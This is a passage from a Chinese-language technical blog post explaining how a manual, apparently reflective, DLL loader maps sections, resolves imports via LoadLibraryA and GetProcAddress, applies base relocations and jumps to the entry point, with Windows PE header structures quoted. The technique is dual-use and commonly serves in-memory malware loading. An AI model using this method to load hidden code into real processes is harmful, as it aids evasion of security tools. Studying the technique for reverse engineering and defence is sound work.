<p>完成映射的首要问题就是：从哪里，到哪里，走多少。对应的就是从<code>fileBase</code>+<code>PointerToRawData</code>到<code>memBase</code>+<code>VirtualAddress</code>，复制<code>SizeOfRawData</code>大小</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151755783.png" alt="image-20250105160856920" /></p>
</li>
<li>
<p>遍历导入表。为了便于分析再次展示<code>IMAGE_IMPORT_DESCRIPTOR</code>结构体</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics;         </span><br><span class="line">        DWORD   OriginalFirstThunk;</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp; </span><br><span class="line">    DWORD   ForwarderChain;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;</span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"> <span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>OriginalFirstThunk</code>：导入名称表的RVA地址</li>
<li><code>Name</code>：DLL（映像文件）名称</li>
<li><code>FirstThunk</code>：导入地址表的RVA地址</li>
</ul>
<p>根据之前我们对PE文件格式的分析，我们首先得到的是DLL的文件名，这时候便可用之前找到的<code>LoadLibraryA</code>去加载这些<strong>我们DLL需要的DLL</strong></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151801023.png" alt="image-20250105164438130" /></p>
<p>接着很自然的想到使用<code>GetProAddress</code>去加载这些函数。具体过程是从<code>FirstThunk</code>中获得<code>IMAGE_IMPORT_BY_NAME </code>，得到函数名称后使用<code>GetProAddress</code>得到函数地址，最后存储到<code>fileBase</code>+<code>PIMAGE_IMPORT_DESCRIPTOR.FirstThunk</code>上。</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151804670.png" alt="image-20250105171719814" /></p>
<p>项目这里对于其他从<code>OriginalFirstThunk</code>开始的情况进行了解析，但是核心思路是一致的。</p>
</li>
<li>
<p>处理重定位。这里有之前PE文件没有说的<code>PIMAGE_BASE_RELOCATION</code>（主要是之前的例子是EXE）</p>
<p>为什么DLL需要重定位？每个DLL最初被设计时，编译器会为其分配一个<strong>首选加载地址</strong>（Preferred Base Address），这通常是一个固定的虚拟内存地址。当多个DLL被加载到同一个进程的地址空间时，如果多个DLL的首选加载地址发生冲突（即两个DLL都希望加载到同一个内存地址），<strong>操作系统无法直接将它们加载到相同的地址</strong>，为了避免这种冲突，操作系统会将其中一个或多个DLL加载到其他地址，这就需要对代码中的绝对地址进行<strong>重定位</strong>。</p>
<p>他保存在NT头的<code>OptionalHeader.DataDirectory</code>中，结构体如下</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@[comment(&quot;MVI_tracked&quot;)]</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_BASE_RELOCATION</span> &#123;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfBlock;</span><br><span class="line"><span class="comment">//  WORD    TypeOffset[1];</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>VirtualAddress</code>：待修正的数据的起始RVA</li>
<li><code>SizeOfBlock</code>：要修正的区块数目</li>
</ul>
<p>在PE格式中一个<code>IMAGE_BASE_RELOCATION</code>数组展现的，这也方便我们进行遍历，最后一个全部成员变量都为0，所以计算要重定位的区块数目的时候记得**-1**。</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151810484.png" alt="image-20250105173117037" /></p>
<p>如何进行修正？<code>PIMAGE_BASE_RELOCATION</code>有一个隐藏的成员<code>TypeOffset</code>，可以通过<code>IMAGE_BASE_RELOCATION+ sizeof(IMAGE_BASE_RELOCATION)</code>找到，可以被解析为</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">	WORD	offset:<span class="number">12</span>;</span><br><span class="line">	WORD	type:<span class="number">4</span>;</span><br><span class="line">&#125; IMAGE_RELOC, *PIMAGE_RELOC;</span><br></pre></td></tr></table></figure>
<p>其中重定位的类型主要是构架的不同导致的，如32位和64位</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Based relocation types.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_ABSOLUTE              0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_HIGH                  1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_LOW                   2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_HIGHLOW               3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_HIGHADJ               4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_MACHINE_SPECIFIC_5    5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_RESERVED              6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_MACHINE_SPECIFIC_7    7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_MACHINE_SPECIFIC_8    8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_MACHINE_SPECIFIC_9    9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_REL_BASED_DIR64                 10</span></span><br></pre></td></tr></table></figure>
<p>在NT头的可选头(OptionalHeader)中有<code>ImageBase</code>，他是dll加载到内存中的第一个字节的首选地址。那么所有待重定位的数据都是根据这个值相对偏移，比如<code>ImageBase=0x1000</code>，现在有个数据默认是在<code>ImageBase</code>偏移的<code>0x10</code>，即理想中的<code>0x1010</code>的位置，文件中的记录就是<code>0x1010</code>；但是现在<code>ImageBase</code>变为了<code>0x2000</code>，那么重定位的位置就是<code>0x2010</code>，由此得到公式：<code>newData = oldData-ImageBase+newMemoryAddress</code>。</p>
<p><strong>重定位的方式</strong>就是在原来的<code>VirtualAddress</code>+<code>IMAGE_RELOC.offset</code>地址中的值加上<code>memBase-ImageBase</code></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151816169.png" alt="image-20250105175336157" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151820285.png" alt="image-20250105173759085" /></p>
</li>
<li>
<p>获得PE文件中<code>AddressOfEntryPoint</code>完成映射后的地址，然后跳转执行。这几乎是最简单的一步了，直接在NT头的可选头(OptionalHeader)中的<code>AddressOfEntryPoint</code>可以得到，这也是PE文件格式分析中强调过的，就是得算一下偏移；最后刷新指令集缓存（可以忽略，但是会增大dll调用失败概率），跳转到程序入口点<code>AddressOfEntryPoint</code>执行（DLL的就为<code>DllMain</code>了）</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151824472.png" alt="image-20250105183441641" /></p>
</li>
</ol>
</div></article><div class="pagination"><a class="pagination__link pagination__prev" href="/2024/10/01/pe_format/">prev_post</a><a class="pagination__link pagination__next" href="/2024/07/24/minhook-source/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2025 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>